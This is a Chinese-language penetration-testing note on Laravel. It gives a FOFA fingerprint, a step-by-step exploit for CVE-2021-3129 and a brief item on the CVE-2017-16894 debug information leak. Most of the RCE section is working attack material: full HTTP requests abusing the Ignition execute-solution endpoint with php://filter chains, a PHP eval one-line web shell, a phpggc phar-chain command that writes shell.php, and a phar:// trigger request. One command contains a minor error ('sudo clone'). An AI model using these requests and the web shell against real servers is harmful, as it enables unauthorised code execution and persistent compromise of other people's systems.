### 指纹

FOFA语法：app="Laravel-Framework"

### 远程代码执行(CVE-2021-3129）

##### 版本

 Laravel <= 8.4.2

##### 原理

反序列化触发代码执行，依靠phpggc中的PHP反序列化生成链

##### 利用

参考文章：[Laravel Debug mode 远程代码执行漏洞(CVE-2021-3129 )_laravel 漏洞-CSDN博客](https://blog.csdn.net/qq_73767109/article/details/131521466)

1.清空日志文件

```
 要知道利用日志就要先清空原来的日志内容，这里要利用到php://filter 中的 convert.base64-decode 过滤器的特性我们首先将日志内容转换成非base64的编码，然后利用这个过滤器进行过滤，因为日志的原内容全是非base64编码的，所以在解码的时候就会解码失败，返回空内容，而当我们以写的形式去利用这个特性的时候就可以清空日志内容了
```

```
POST /_ignition/execute-solution HTTP/1.1
Host: 192.168.200.128:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 317
 
 
{
 "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
 "parameters": {
 "variableName": "asdf",
 "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
 }
}
```

2.写入payload

首先先写入一句话木马到web.shell中

```php
 <?php  eval($_POST[cmd]);?>
```

 base64编码

```cmd
PD9waHAgIGV2YWwoJF9QT1NUW2NtZF0pOz8+
```

拉取工具

```cmd
sudo clone https://github.com/ambionics/phpggc.git
```

将一句话木马生成phar文件要利用攻击phpggc

```cmd
php -d "phar.readonly=0" ./phpggc Laravel/RCE5 "system('echo PD9waHAgIGV2YWwoJF9QT1NUW2NtZF0pOz8+|base64 -d > /var/www/html/shell.php');" --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex(ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
```

此时会生成一堆编码

![img](https://i-blog.csdnimg.cn/blog_migrate/f8219eef305ebf7bc6e52358ad2b8bb9.png)

3.在生成后的编码最后加上一个字符使后面的存入日志的编码错开

=54=......=4B=00**X**

4.传送payload数据包之前，先传入一个无关紧要的数据包

5. 最后传入payload数据包

![img](https://i-blog.csdnimg.cn/blog_migrate/ba85e8b5d44ae65560d585307abc3c63.png)

6.删除多余的payload

```
POST /_ignition/execute-solution HTTP/1.1
Host: 192.168.200.128:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 292
 
{
 "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
 "parameters": {
 "variableName": "asdf",
 "viewFile": "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
 }
} 
```

7.phar协议触发反序列化

```
POST /_ignition/execute-solution HTTP/1.1
Host: 192.168.200.128:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 199
 
{
 "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
 "parameters": {
 "variableName": "asdf",
 "viewFile": "phar://../storage/logs/laravel.log/test.txt"
 }
}
```

8.最后访问shell.php即可POST进行getshell

------

或者直接用python跑工具exp即可

### 信息泄露(CVE-2017-16894)

##### 原理

在laravel框架的.env[配置文件](https://so.csdn.net/so/search?q=配置文件&spm=1001.2101.3001.7020)中，默认调试功能debug是开启的。当使程序报错时。在前台会返回报错详情、环境变量、服务器配置等敏感信息。

##### 版本

全版本

##### 利用

1、burp抓包，修改请示方法为POST，提交1=2让程序报错

![img](https://i-blog.csdnimg.cn/direct/db7c37db9686436abc848d5ab4d5c92c.png)

2、报错信息出现敏感信息。